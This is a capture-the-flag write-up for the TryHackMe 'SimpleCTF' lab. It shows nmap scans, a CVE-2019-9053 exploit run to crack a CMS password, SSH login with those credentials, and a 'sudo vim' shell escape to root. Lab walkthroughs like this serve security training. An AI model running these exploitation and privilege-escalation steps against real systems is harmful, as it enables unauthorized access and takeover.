### THM SimpleCTF

Got another one here.  Let's get to it.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.60.101                        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 10:17 EST
Nmap scan report for 10.10.60.101
Host is up (0.11s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 165.98 seconds
```

Looks like 21, 80, and 2222.

```
(kali@kali)-$ sudo nmap -A -Pn -p 21,80,2222 10.10.60.101               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 10:21 EST
Nmap scan report for 10.10.60.101
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.15.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 3.X (90%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   47.48 ms  10.6.0.1
2   ... 3
4   115.43 ms 10.10.60.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.84 seconds
```

Tried FTP anonymous login, no luck.  Checked for vulns on different things, no luck there either really.  I did note that 2222 is actually ssh, instead of the normal port.

Let's check the website itself.

![Apache default](/Images/THM2SimpleCTF/pic1.png)

Defautl apache page.  Ok, let's bust out dirbuster.  Hehe, see what I did there.

![dirbuster](/Images/THM2SimpleCTF/pic2.png)

Looks like we have a directory to check out.  Let's give it a look.

![dirbuster](/Images/THM2SimpleCTF/pic3.png)

CMS Made simple.  Looks like a website management tool.

![dirbuster](/Images/THM2SimpleCTF/pic4.png)

Looks like we have a version number too.  2.2.8.

So a google check gives me a vulnverability for this tool.  CVE-2019-9053.  Looking at that it gives me a python program.  Took me a few tried to figure out how to get it to run correctly but was finally able to get it going.

`python2 cms.py -u http://10.10.60.101/simple/ --crack -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-1000000.txt`

So ended up having to put the base directory for the site.  I tried the /admin/ site and that didn't work.  Once I got it figured out though, it took a sec to run through but I got this...

![cracked password](/Images/THM2SimpleCTF/pic5.png)

Now that we have that username and password, let's put it to use.

We saw earlier that ssh was on a different port, so we try that by adding the `-p 2222` and use the password we got before.

```
(kali@kali)-$ ssh mitch@10.10.60.101 -p 2222
mitch@10.10.60.101's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Nov 11 16:48:38 2024 from 10.6.15.116
$
```

Look at that.  We're in.  Now that we have low level user, lets get to our enumeration for a Linux box.  One of the things to check is the `sudo -l` command, so lets do that.

```
$ sudo -l 
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$
```

Looks like I can run vim as sudo without a password.  Go out to our GTFObins and find a command for vim to get a root shell.

`sudo vim -c ':!/bin/sh'`

Do that, but with /bin/bash cause bash is so much better.

And that gives us our root.

```
$ sudo vim -c ':!/bin/bash'  

root@Machine:~# 
root@Machine:~# whoami
root
```

And that's ownage!  This was a quick one.  Lots of fun once I got the command to run correctly from the exploit.  Wonder if there is a script or something to make python2 things work with python3.

Anyway, thanks for joining me for another THM box.
